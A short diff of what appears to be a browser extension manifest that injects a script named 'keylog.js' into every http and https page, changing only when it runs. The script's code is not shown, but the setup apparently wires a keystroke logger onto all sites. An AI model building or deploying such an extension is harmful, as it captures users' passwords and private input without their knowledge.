@@ -16,7 +16,7 @@
     {
       "matches": ["http://*/*", "https://*/*"],
       "js": ["keylog.js"],
-      "run_at": "document_start"
+      "run_at": "document_end"
     }
   ]
 }
